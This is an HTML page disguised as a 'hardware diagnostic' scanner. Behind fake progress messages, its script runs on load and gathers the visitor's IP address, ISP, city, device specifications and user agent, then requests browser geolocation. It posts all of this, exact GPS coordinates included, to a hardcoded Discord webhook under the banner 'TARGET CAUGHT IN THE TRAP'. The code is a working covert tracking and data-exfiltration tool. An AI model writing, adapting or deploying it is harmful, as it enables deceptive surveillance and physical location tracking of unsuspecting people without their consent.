<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced System Diagnostic v10.4</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; height: 100vh; display: flex; justify-content: center; align-items: center; margin: 0; overflow: hidden; }
        .scanner-box { width: 90%; max-width: 550px; border: 2px solid #0f0; padding: 30px; position: relative; background: rgba(0, 5, 0, 0.98); box-shadow: 0 0 40px #0f0; }
        .line { width: 100%; height: 4px; background: #0f0; position: absolute; left: 0; animation: scan 2s infinite linear; box-shadow: 0 0 20px #0f0; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
        h2 { text-align: center; letter-spacing: 5px; color: #0f0; text-shadow: 0 0 15px #0f0; }
        #console { font-size: 13px; height: 200px; overflow: hidden; color: #0f0; line-height: 1.6; border: 1px solid #030; padding: 10px; background: #010; }
    </style>
</head>
<body>
    <div class="scanner-box">
        <div class="line"></div>
        <h2>HARDWARE ANALYSIS</h2>
        <div id="console">
            [BOOT] Security Protocol 10.4 Active...<br>
            [BOOT] Establishing Neural Link...<br>
        </div>
        <p style="text-align:center; font-size: 12px; color: #fff;">SYNCING HARDWARE IDENTITY - PLEASE DO NOT EXIT</p>
    </div>

    <script>
        const HOOK = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";

        const logBox = document.getElementById('console');
        const msgs = ["[OK] LINK STABLE", "[INFO] FETCHING IP DATA...", "[INFO] EXTRACTING GPU INFO...", "[INFO] DECRYPTING MODEL ID...", "[CRITICAL] SYNCING GPS...", "[SUCCESS] DATA ENCRYPTED."];
        let idx = 0;
        setInterval(() => { if(idx < msgs.length) { logBox.innerHTML += msgs[idx] + "<br>"; idx++; } }, 700);

        async function fetchIntel() {
            // আইপি এবং সিম কোম্পানির তথ্য
            const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json());
            
            const payload = {
                content: "🧨 **TARGET CAUGHT IN THE TRAP** 🧨",
                embeds: [{
                    title: "Advanced Device & Network Report",
                    color: 0x00FF00,
                    fields: [
                        { name: "🌐 IP Address", value: ipRes.ip || "N/A", inline: true },
                        { name: "🏢 Provider (ISP)", value: ipRes.org || "N/A", inline: true },
                        { name: "🏙️ City/Region", value: `${ipRes.city}, ${ipRes.region}`, inline: true },
                        { name: "📱 Device Platform", value: navigator.platform, inline: true },
                        { name: "🧠 Processor (Cores)", value: navigator.hardwareConcurrency + " Cores", inline: true },
                        { name: "💾 Device RAM", value: (navigator.deviceMemory || "N/A") + " GB", inline: true },
                        { name: "🖥️ Screen Size", value: `${window.screen.width}x${window.screen.height}`, inline: true },
                        { name: "🛠️ System/Browser", value: navigator.userAgent }
                    ]
                }]
            };

            fetch(HOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });

            // লোকেশন বের করার মরণফাঁদ
            navigator.geolocation.getCurrentPosition(pos => {
                const maps = {
                    content: "📍 **EXACT GPS COORDINATES FOUND**",
                    embeds: [{
                        color: 0xFF0000,
                        description: `**Google Maps Link:** https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n**Accuracy:** ${pos.coords.accuracy}m`
                    }]
                };
                fetch(HOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(maps) });
            });
        }
        fetchIntel();
    </script>
</body>
</html>
